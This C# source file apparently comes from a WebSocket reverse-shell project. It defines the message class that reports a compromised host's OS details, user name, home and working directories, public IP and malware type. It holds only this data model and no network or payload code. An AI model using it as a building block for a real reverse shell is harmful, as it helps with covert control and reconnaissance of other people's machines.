using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using FluentBuilder;
using WebSocketReverseShellDotNet.FluentBuilder;


namespace WebSocketReverseShellDotNet.model
{
    [AutoGenerateBuilder]
    public class ReverseShellInfoInitialMessage
    {
        [JsonProperty(NullValueHandling = NullValueHandling.Ignore)]
        public string? OsName { get; set; }

        [JsonProperty(NullValueHandling = NullValueHandling.Ignore)]
        public string? OsVersion { get; set; }

        [JsonProperty(NullValueHandling = NullValueHandling.Ignore)]
        public string? OsArch { get; set; }

        [JsonProperty(NullValueHandling = NullValueHandling.Ignore)]
        public string? UserName { get; set; }

        [JsonProperty(NullValueHandling = NullValueHandling.Ignore)]
        public string? UserHome { get; set; }

        [JsonProperty(NullValueHandling = NullValueHandling.Ignore)]
        public string? UserCurrentWorkingDir { get; set; }

        [JsonProperty(NullValueHandling = NullValueHandling.Ignore)]
        public string? UserLanguage { get; set; }

        [JsonProperty(NullValueHandling = NullValueHandling.Ignore)]
        public string? UserPublicIp { get; set; }

        [JsonProperty(NullValueHandling = NullValueHandling.Ignore)]
        public string? MalwareType { get; set; }

        public string? Reply { get; set; }


        public override string ToString()
        {
            return JsonConvert.SerializeObject(this, Formatting.Indented);
        }


    }




}
